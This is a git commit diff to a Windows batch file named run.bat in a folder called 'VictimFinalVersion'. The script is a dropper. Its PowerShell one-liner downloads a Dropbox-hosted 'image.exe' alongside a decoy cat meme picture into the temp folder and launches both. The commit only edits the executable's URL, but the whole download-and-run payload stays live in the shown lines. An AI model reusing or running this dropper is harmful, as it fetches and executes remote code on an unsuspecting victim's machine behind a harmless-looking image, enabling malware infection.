75ff5131832ea8f24ada25c86a42b9ae17863761
devkaare <kaarehofferdal@gmail.com>
2025-02-02 03:58:27 +0100

    Feat

--- VictimFinalVersion/run.bat
+++ VictimFinalVersion/run.bat
@@ -1,6 +1,6 @@
 @echo on
 
-set files="https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0","https://www.cats.org.uk/media/6099/laptop-cat-meme-400px.jpg?width=400&height=306"
+set files="https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe","https://www.cats.org.uk/media/6099/laptop-cat-meme-400px.jpg?width=400&height=306"
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
